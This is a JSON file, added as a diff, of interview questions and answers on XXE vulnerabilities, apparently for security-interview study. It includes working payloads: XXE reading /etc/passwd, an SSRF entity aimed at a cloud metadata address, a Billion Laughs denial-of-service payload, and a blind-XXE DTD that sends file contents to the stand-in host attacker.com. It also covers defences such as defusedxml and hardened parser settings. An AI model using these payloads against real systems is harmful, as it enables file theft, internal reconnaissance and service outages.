@@ -1,0 +1,91 @@
+{
+  "topicId": "xxe",
+  "name": "XXE",
+  "source": "XXE/XXE - Interview Questions & Answers.md",
+  "prompts": [
+    {
+      "id": "p5e7aae7bb5c9c3",
+      "cluster": "Fundamental Questions",
+      "title": "What is XXE and how does it work?",
+      "seconds": 120,
+      "answerMarkdown": "XXE (XML External Entity) is a vulnerability that allows attackers to exploit XML parsers by including external entities, leading to information disclosure, SSRF attacks, or denial of service.\n\n**How it works:**\n\n1. **Attacker submits malicious XML:**\n\n    ```xml\n    <!DOCTYPE foo [\n      <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n    ]>\n    <foo>&xxe;</foo>\n\n    ```\n\n2. **XML Parser Processes DTD:**\n    - Parser reads DOCTYPE declaration\n    - Defines external entity\u00a0`xxe`\n    - Resolves\u00a0`file:///etc/passwd`\u00a0URI\n3. **Entity Expansion:**\n    - Parser expands\u00a0`&xxe;`\u00a0entity\n    - Replaces with contents of\u00a0`/etc/passwd`\n    - Includes sensitive file contents in response\n4. **Attacker Receives Data:**\n    - File contents returned in XML response\n    - Attacker extracts sensitive information\n\n**Key Point:**\u00a0XXE occurs when XML parsers process external entities without proper restrictions, allowing file reading, SSRF, or DoS attacks.\n\n---"
+    },
+    {
+      "id": "p36e674164907fa",
+      "cluster": "Fundamental Questions",
+      "title": "What are the different types of XXE attacks?",
+      "seconds": 120,
+      "answerMarkdown": "**1. File Disclosure (In-Band):**\n\n- Attacker reads local files\n- File contents returned directly in response\n- Example: Reading\u00a0`/etc/passwd`\n\n**2. SSRF (Server-Side Request Forgery):**\n\n- Attacker makes server perform HTTP requests\n- Access internal or external resources\n- Example:\u00a0`<!ENTITY xxe SYSTEM \"http://internal-server:8080/admin\">`\n\n**3. Blind XXE (Out-of-Band):**\n\n- Attacker extracts data indirectly via external servers\n- File contents not returned directly\n- Uses parameter entities and external DTD files\n\n**4. Denial of Service (DoS):**\n\n- Attacker causes entity expansion attacks\n- Exhausts server resources\n- Example: Billion Laughs attack\n\n---"
+    },
+    {
+      "id": "p336c63d2b534d2",
+      "cluster": "Fundamental Questions",
+      "title": "Why are JSON APIs sometimes vulnerable to XXE?",
+      "seconds": 90,
+      "answerMarkdown": "JSON APIs can be vulnerable if they:\n\n- Accept XML input (content-type negotiation)\n- Process XML-based file formats (Office docs, SVG images)\n- Have endpoints that accept multiple formats\n\n**Example:**\n\n```python\n@app.route('/api/data', methods=['POST'])\ndef api_handler():\n    content_type = request.headers.get('Content-Type')\n    if 'xml' in content_type:\n        xml_data = request.data\n        parse(xml_data)  # XXE vulnerability!\n\n```\n\n**Key Point:**\u00a0Any endpoint accepting XML input can be vulnerable, regardless of primary format.\n\n---"
+    },
+    {
+      "id": "p47f15165265b4c",
+      "cluster": "Attack Mechanisms",
+      "title": "Explain how a file disclosure XXE attack works.",
+      "seconds": 90,
+      "answerMarkdown": "**Attack Payload:**\n\n```xml\n<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n]>\n<foo>&xxe;</foo>\n\n```\n\n**How It Works:**\n\n1. DOCTYPE declaration defines external entity\n2. Entity references\u00a0`file:///etc/passwd`\n3. XML parser resolves entity\n4. File contents replace\u00a0`&xxe;`\u00a0entity\n5. File contents returned in XML response\n\n**Vulnerable Code:**\n\n```python\nfrom xml.etree.ElementTree import parse\ntree = parse(xml_data)  # Vulnerable!\n\n```\n\n**Result:**\n\n```xml\n<foo>root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n...</foo>\n\n```\n\n---"
+    },
+    {
+      "id": "pf9b55025225748",
+      "cluster": "Attack Mechanisms",
+      "title": "How does blind XXE work?",
+      "seconds": 120,
+      "answerMarkdown": "**Blind XXE**\u00a0is used when file contents aren't returned directly in the response.\n\n**Attack Payload:**\n\n```xml\n<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n  <!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\">\n  %xxe;\n]>\n<foo>test</foo>\n\n```\n\n**evil.dtd (on attacker's server):**\n\n```xml\n<!ENTITY % file SYSTEM \"file:///etc/passwd\">\n<!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?%file;'>\">\n%eval;\n%exfil;\n\n```\n\n**How It Works:**\n\n1. Parameter entity loads external DTD\n2. External DTD defines file entity\n3. File contents extracted via parameter entity chaining\n4. Data sent to attacker's server via HTTP request\n\n**Key Point:**\u00a0Blind XXE uses out-of-band techniques to exfiltrate data when direct response is not available.\n\n---"
+    },
+    {
+      "id": "p497dd77e21a329",
+      "cluster": "Mitigation Questions",
+      "title": "How do you prevent XXE attacks?",
+      "seconds": 120,
+      "answerMarkdown": "**Primary Defense: Disable External Entities**\n\n**Python (defusedxml - Recommended):**\n\n```python\nfrom defusedxml.ElementTree import parse\ntree = parse(xml_data)  # Safe! External entities disabled by default\n\n```\n\n**Python (lxml - Secure Configuration):**\n\n```python\nfrom lxml import etree\n\nparser = etree.XMLParser(resolve_entities=False, no_network=True)\ntree = etree.parse(xml_data, parser)\n\n```\n\n**Java:**\n\n```java\nDocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();\ndbf.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true);\ndbf.setFeature(\"http://xml.org/sax/features/external-general-entities\", false);\ndbf.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", false);\n\n```\n\n**Additional Defenses:**\n\n- Use secure XML parsers (defusedxml)\n- Input validation (reject DOCTYPE declarations)\n- Use JSON when possible\n- Restrict network access\n\n**Key Point:**\u00a0Disable external entities and use secure XML parsers. Input validation helps but isn't sufficient alone.\n\n---"
+    },
+    {
+      "id": "p0eb243d5420c44",
+      "cluster": "Mitigation Questions",
+      "title": "Why is disabling external entities the primary defense?",
+      "seconds": 120,
+      "answerMarkdown": "**External entities enable XXE attacks:**\n\n- Allow referencing external resources (files, URLs)\n- Entity expansion includes external content\n- Can be chained for complex attacks\n\n**Without External Entities:**\n\n- Only internal entities allowed\n- No file system access\n- No network requests\n- XXE attacks impossible\n\n**Example:**\n\n```python\n# Vulnerable: External entities enabled\nfrom xml.etree.ElementTree import parse\ntree = parse(xml_data)  # Can access files/URLs\n\n# Secure: External entities disabled\nfrom defusedxml.ElementTree import parse\ntree = parse(xml_data)  # Cannot access files/URLs\n\n```\n\n**Key Point:**\u00a0Disabling external entities prevents all XXE attack vectors (file disclosure, SSRF, DoS).\n\n---"
+    },
+    {
+      "id": "p5ef40c21098b49",
+      "cluster": "Security Questions",
+      "title": "What is the impact of XXE vulnerabilities?",
+      "seconds": 120,
+      "answerMarkdown": "**1. Information Disclosure:**\n\n- Read sensitive files (passwords, keys, configs)\n- Access source code\n- Extract database credentials\n\n**2. Server-Side Request Forgery (SSRF):**\n\n- Access internal services\n- Port scanning\n- Access cloud metadata APIs\n- Internal network reconnaissance\n\n**3. Denial of Service:**\n\n- Entity expansion attacks (Billion Laughs)\n- Server resource exhaustion\n- Application unavailability\n\n**4. Remote Code Execution (Rare):**\n\n- In some cases, XXE can lead to RCE\n- Often requires specific configurations\n- More common in PHP applications\n\n**Business Impact:**\n\n- Data breach\n- Internal network compromise\n- Service unavailability\n- Regulatory violations\n\n---"
+    },
+    {
+      "id": "p00b2fbdb727052",
+      "cluster": "Security Questions",
+      "title": "Can XXE lead to SSRF attacks?",
+      "seconds": 90,
+      "answerMarkdown": "**Yes, XXE can lead to SSRF attacks.**\n\n**Example:**\n\n```xml\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">\n]>\n<foo>&xxe;</foo>\n\n```\n\n**How It Works:**\n\n1. External entity references HTTP URL\n2. XML parser resolves entity\n3. Server makes HTTP request to URL\n4. Request originates from server (SSRF)\n\n**Impact:**\n\n- Access internal services\n- Cloud metadata API access\n- Port scanning\n- Internal network reconnaissance\n\n**Mitigation:**\n\n- Disable external entities\n- Restrict network access\n- Use secure parsers\n\n---"
+    },
+    {
+      "id": "pcec7901a0462d1",
+      "cluster": "Scenario-Based Questions",
+      "title": "You discover XXE in a SOAP endpoint. How would you fix it?",
+      "seconds": 120,
+      "answerMarkdown": "**Vulnerable Code:**\n\n```python\nfrom xml.etree.ElementTree import parse\nfrom flask import request\n\n@app.route('/soap', methods=['POST'])\ndef soap_handler():\n    xml_data = request.data\n    tree = parse(xml_data)  # Vulnerable!\n    return soap_response\n\n```\n\n**Fix (Secure Parser):**\n\n```python\nfrom defusedxml.ElementTree import parse\n\n@app.route('/soap', methods=['POST'])\ndef soap_handler():\n    xml_data = request.data\n    tree = parse(xml_data)  # Safe!\n    return soap_response\n\n```\n\n**Alternative (Configure Parser Securely):**\n\n```python\nfrom lxml import etree\n\n@app.route('/soap', methods=['POST'])\ndef soap_handler():\n    xml_data = request.data\n    parser = etree.XMLParser(resolve_entities=False, no_network=True)\n    tree = etree.parse(xml_data, parser)  # Safe!\n    return soap_response\n\n```\n\n**Additional Defenses:**\n\n- Input validation (reject DOCTYPE if possible)\n- Network restrictions\n- File system permissions\n\n---"
+    },
+    {
+      "id": "p1114ec9151d526",
+      "cluster": "Advanced Questions",
+      "title": "What is the Billion Laughs attack?",
+      "seconds": 120,
+      "answerMarkdown": "**Billion Laughs Attack**\u00a0is a denial of service attack using entity expansion.\n\n**Payload:**\n\n```xml\n<?xml version=\"1.0\"?>\n<!DOCTYPE lolz [\n  <!ENTITY lol \"lol\">\n  <!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">\n  <!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\">\n  <!ENTITY lol4 \"&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;\">\n  <!ENTITY lol5 \"&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;\">\n  <!ENTITY lol6 \"&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;\">\n  <!ENTITY lol7 \"&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;\">\n  <!ENTITY lol8 \"&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;\">\n  <!ENTITY lol9 \"&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;\">\n]>\n<lolz>&lol9;</lolz>\n\n```\n\n**How It Works:**\n\n- Each entity expands multiple times\n- Exponential growth in entity size\n- Exhausts memory/CPU resources\n\n**Mitigation:**\n\n- Disable external entities\n- Limit entity expansion\n- Use secure parsers\n\n---"
+    },
+    {
+      "id": "pc28f8a214ca5bb",
+      "cluster": "Advanced Questions",
+      "title": "How do parameter entities differ from general entities?",
+      "seconds": 90,
+      "answerMarkdown": "**General Entities:**\n\n- Used in XML document content\n- Syntax:\u00a0`<!ENTITY name \"value\">`\n- Referenced as:\u00a0`&name;`\n\n**Parameter Entities:**\n\n- Used in DTD definitions only\n- Syntax:\u00a0`<!ENTITY % name \"value\">`\n- Referenced as:\u00a0`%name;`\n- Can be chained for complex attacks\n\n**Example (Parameter Entity):**\n\n```xml\n<!DOCTYPE foo [\n  <!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\">\n  %xxe;\n]>\n\n```\n\n**Key Point:**\u00a0Parameter entities are more powerful and can be used in blind XXE attacks via external DTD files.\n\n---"
+    }
+  ]
+}
